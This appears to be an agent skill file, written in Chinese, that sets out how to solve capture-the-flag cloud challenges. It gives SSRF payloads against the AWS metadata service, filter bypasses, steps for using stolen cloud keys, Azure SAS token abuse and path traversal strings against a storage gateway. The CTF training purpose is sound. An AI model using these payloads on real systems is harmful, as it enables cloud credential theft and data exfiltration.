---
name: cloud-attack
description: 云攻击 SOP（d 系列）——AWS EC2/元数据、Azure SAS 过度权限、对象存储网关真题型打法
---

## d 系列已知题型（2026-08-15 情报，缺口：D-03/04/06）

### D-03 · AWS EC2 云主机应用评估（hard, 400 分）
- 目标是 EC2 上的 Web 应用 → **SSRF/XXE 打 IMDS 拿实例凭据**：
  - IMDSv1：`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<角色名>`（先列 `.../iam/security-credentials/` 拿角色名）
  - 绕 SSRF 过滤：`http://[::ffff:169.254.169.254]`、十进制 IP `http://2852039166/`、`http://169.254.169.254@evil/`、DNS 重绑定、302 跳转
  - IMDSv2 需先 PUT 拿 token：`X-aws-ec2-metadata-token-ttl: 21600`（若应用能发任意方法）
- 拿到 AK/SK 后：`aws configure` 填入 → `aws sts get-caller-identity` 确认 → `aws s3 ls`、`aws secretsmanager list-secrets`、`aws ssm get-parameters`、读 EC2 user-data（`aws ec2 describe-instances --instance-ids x --query 'Reservations[].Instances[].UserData'`）翻 flag
- EC2 上的应用本身也别放过：env（`/proc/self/environ`）、启动脚本、S3 同步目录

### D-04 · Azure Storage SAS Overprivilege（medium, 300 分）——题名即答案
- **SAS 签名过度权限**：拿到的 SAS token 权限比业务需要的大（能 List/Write/Delete 而非只读）
- 用 `az storage blob list --container-name <c> --sas-token "$SAS"` 列举（容器名可从 token 的 `st=`/URL 路径或枚举常见名：flag、flags、secret、data、backup、uploads）
- `az storage blob download --sas-token ... -f /tmp/out` 拉文件翻 flag；也试 `az storage container list --sas-token`（若 token 是账户级）
- SAS token 结构自查：URL 参数里 `sig=`（签名）、`sp=`（权限位 r/w/l/d）、`sr=`（作用域 b/c）
- 没装 az CLI 时直接构造 REST：`curl "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list&$SAS"`

### D-06 · CloudVault 对象存储网关（medium, 300 分）
- "网关"= 自己实现的存储代理 → 常见洞：**未授权列举**（`GET /` 列 bucket）、**路径穿越**（`GET /files/..%2f..%2fflag`）、**签名绕过**（改 path 不重算签名）、**公开读私有对象**（猜对象名：flag.txt、secret、backup.tar）
- 先 fuzz 网关 API 路由（/admin /list /buckets /files /health），再看鉴权头（Authorization 签名结构、token 可否复用到别的路径）

### D-01/02/05（已解）沉淀的打法
- 元数据服务三大件：AWS `169.254.169.254`、GCP `metadata.google.internal`（要 `Metadata-Flavor: Google` 头）、阿里云 `100.100.100.200`
- 云 CLI 已预装：awscli / az（若无 az 用 REST）/ tccli / aliyun；`cloudfox aws --regions all` 深挖

## 云题通用纪律
- 拿到任何凭据（AK/SK、SAS、JWT）→ **先枚举身份和权限边界**（sts get-caller-identity / az whoami）→ 再按权限找数据
- 云上 flag 高频位置：S3/OSS 对象、Secrets Manager、SSM Parameter、EC2 user-data、环境变量、CloudFormation/资源 tag
